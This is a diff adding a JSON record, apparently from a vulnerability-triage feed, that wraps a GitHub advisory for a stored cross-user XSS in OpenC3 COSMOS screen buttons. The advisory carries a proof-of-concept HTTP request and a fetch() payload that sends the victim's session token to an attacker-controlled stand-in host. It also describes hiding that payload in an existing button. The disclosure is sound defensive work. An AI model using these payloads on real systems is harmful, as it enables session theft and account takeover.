@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/19728679?v=4\", \"events_url\": \"https://api.github.com/users/ArpitKubadia/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ArpitKubadia/followers\", \"following_url\": \"https://api.github.com/users/ArpitKubadia/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ArpitKubadia/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ArpitKubadia\", \"id\": 19728679, \"login\": \"ArpitKubadia\", \"node_id\": \"MDQ6VXNlcjE5NzI4Njc5\", \"organizations_url\": \"https://api.github.com/users/ArpitKubadia/orgs\", \"received_events_url\": \"https://api.github.com/users/ArpitKubadia/received_events\", \"repos_url\": \"https://api.github.com/users/ArpitKubadia/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ArpitKubadia/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ArpitKubadia/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ArpitKubadia\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-77394\", \"cvss\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.6, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"## Summary\\nA user who can save a telemetry **screen** (permission `system_set`) can embed JavaScript in a screen `BUTTON` widget. The `BUTTON` widget **`eval()`s the stored button text in the browser** when the button is activated, and screens are **shared content rendered to other users in the scope**. As a result, an attacker's stored JavaScript executes **in a different operator's authenticated session** — a **stored, cross-user XSS** (not self-XSS). The payload runs in the COSMOS origin and can read `localStorage.openc3Token` (the victim's session token), enabling **session/account takeover** and, via the victim's privileges, a path to server-side code execution through the Script Runner.\\n\\nThe site's Content-Security-Policy permits `'unsafe-inline'`/`'unsafe-eval'` (see \\\"Contributing factor\\\"), so the injected script runs unimpeded.\\n\\n- **Product:** OpenC3 COSMOS (Core; likely Enterprise — see scoping note)\\n- **Affected version:** confirmed **7.2.0** (latest, tested 2026-06-25); the code path is present on `main`. Lower bound for maintainer to confirm.\\n- **Reporter:** _Arpit Kubadia_ \\n\\n## Description & root cause\\n1. **Screen save (the store):** `POST /openc3-api/screen` → `ScreensController#create` (`openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb:35-43`) persists the raw screen text after `authorization('system_set')`. No sanitization of the screen body.\\n2. **The sink (the execution):** the `BUTTON` widget stores the button's action as its second parameter and **`eval()`s it on click** — `openc3-cosmos-init/plugins/packages/openc3-vue-common/src/widgets/ButtonWidget.vue:109`:\\n   ```js\\n   const lines = this.eval.split(';;')   // this.eval == parameters[1] from the stored screen\\n   ...\\n   const result = eval(lines[i].trim())  // attacker-controlled string -> arbitrary JS in the victim's session\\n   ```\\n3. **Cross-user delivery:** screens are stored per-scope and rendered to **any** user who opens them (e.g. in Telemetry Viewer). So a screen saved by user A executes in user B's browser.\\n4. **Contributing factor (CSP):** `openc3-traefik/traefik.yaml:63` sets `script-src 'unsafe-inline' 'unsafe-eval' https: blob: ...` on every SPA response, so the injected/eval'd script is not blocked. (Reportable as a hardening item in its own right.)\\n\\n## Proof of Concept\\n\\n### A. Minimal PoC — a button that steals the viewer's token (verified)\\nAuthenticated as any user (Core) / a `system_set` user (Enterprise), store a screen:\\n```\\nPOST /openc3-api/screen HTTP/1.1\\nHost: localhost:2900\\nContent-Type: application/json\\nAuthorization: ses_<YOUR_TOKEN>\\nContent-Length: 224\\n\\n{\\\"scope\\\":\\\"DEFAULT\\\",\\\"target\\\":\\\"INST\\\",\\\"screen\\\":\\\"XSSPOC\\\",\\\"text\\\":\\\"SCREEN AUTO AUTO 1.0\\\\nLABEL \\\\\\\"Instrument Status\\\\\\\"\\\\nBUTTON 'Refresh' 'fetch(\\\\\\\"https://ATTACKER-COLLABORATOR/?t=\\\\\\\"+encodeURIComponent(localStorage.openc3Token))'\\\\n\\\"}\\n```\\n→ HTTP 200, body `true`. **Trigger (as the victim):** open `http://<host>:2900/tools/tlmviewer` → Target `INST`, Screen `XSSPOC` → click **Refresh**. The victim's session token is exfiltrated to `ATTACKER-COLLABORATOR`. *(Verified: an out-of-band request carrying a live `ses_…` token was received at the attacker host.)*\\n\\nA purely visual variant: replace the action with `alert(localStorage.openc3Token)`.\\n\\n### B. Realistic exploitation — hijack an EXISTING operational screen (no lure)\\nThe minimal PoC needs the victim to open the attacker's screen. The realistic attack overwrites a screen operators **already use**, hiding the payload behind a button they **already click**:\\n- The `BUTTON` action is `eval`'d after `this.eval.split(';;')`, so **appending `;; <payload>` to an existing button keeps the original command working and adds the attacker's code**. The operator sees no change.\\n- Example: take the stock `INST COMMANDING` screen's **`Start Collect`** button (which sends `api.cmd('INST COLLECT ...')`) and append:\\n  ```\\n  ... +\\n  \\\" ;; fetch('https://ATTACKER-COLLABORATOR/?t='+encodeURIComponent(localStorage.openc3Token))\\\"\\n  ```\\n  Re-save the screen (`POST /openc3-api/screen`, same route). Now every operator who opens COMMANDING and clicks `Start Collect` during normal operations sends the real command **and** leaks their session token. No new button, no behavioral change, no social-engineering lure.\\n\\n## Impact\\nThe injected script runs with the victim's session in the COSMOS origin. It can:\\n- **Exfiltrate the victim's session token** (`localStorage.openc3Token`) → session/account takeover (the token is a bearer credential accepted in the `Authorization` header).\\n- Act as the victim against the API, and — for a victim with script privileges — pivot to the **Script Runner** to achieve **server-side code execution** (the documented escalation chain).\\nThis is **cross-user / persistent**: an attacker who can edit shared screens compromises the sessions of other operators viewing those screens, which is materially worse than self-XSS.\\n\\n## Remediation\\n1. **Do not `eval()` screen-supplied strings.** Replace the `BUTTON` widget's `eval` with a constrained, non-`eval` command interface (an allow-listed API surface / safe expression evaluator), or sandbox it.\\n2. **Tighten the CSP** (`openc3-traefik/traefik.yaml`): remove `'unsafe-inline'`/`'unsafe-eval'`, move to per-request `nonce` + `'strict-dynamic'`, add `object-src 'none'`, `base-uri 'self'`, `frame-ancestors 'self'`. This alone neutralizes injected inline/eval'd script.\\n3. **Treat screens as untrusted, cross-user content** — escape/validate on render; consider gating screen-embedded JavaScript behind a dedicated, clearly-privileged capability rather than the general `system_set`.\", \"ghsa_id\": \"GHSA-gvf2-2rh5-mpgf\", \"github_reviewed_at\": \"2026-09-23T21:24:11Z\", \"html_url\": \"https://github.com/advisories/GHSA-gvf2-2rh5-mpgf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-gvf2-2rh5-mpgf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-77394\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-23T21:24:11Z\", \"references\": [\"https://github.com/OpenC3/cosmos/security/advisories/GHSA-gvf2-2rh5-mpgf\", \"https://github.com/OpenC3/cosmos/pull/3560\", \"https://github.com/OpenC3/cosmos/commit/10371f8f410b9ad588f98dfa3befaaacb6587cd3\", \"https://github.com/OpenC3/cosmos/releases/tag/v7.3.0\", \"https://github.com/advisories/GHSA-gvf2-2rh5-mpgf\"], \"repository_advisory_url\": \"https://api.github.com/repos/OpenC3/cosmos/security-advisories/GHSA-gvf2-2rh5-mpgf\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/OpenC3/cosmos\", \"summary\": \"OpenC3 COSMOS: Stored, cross-user XSS via Telemetry screen BUTTON widget\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-23T21:24:12Z\", \"url\": \"https://api.github.com/advisories/GHSA-gvf2-2rh5-mpgf\", \"vulnerabilities\": [{\"first_patched_version\": \"7.3.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@openc3/vue-common\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 5.0.6, <= 7.2.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-gvf2-2rh5-mpgf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@openc3/vue-common: >= 5.0.6, <= 7.2.1"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-77394"
+    ],
+    "cvss_score": 7.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@openc3/vue-common"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-24T19:13:54.906946Z",
+  "provenance": {
+    "content_sha256": "04f480cb6a85518ed7db8d355e4c42b51041315eea348058a6f1920567ad9ef4",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-23T21:24:11Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-gvf2-2rh5-mpgf",
+  "status": "active",
+  "title": "OpenC3 COSMOS: Stored, cross-user XSS via Telemetry screen BUTTON widget",
+  "updated_at": "2026-09-23T21:24:12Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-gvf2-2rh5-mpgf"
+}
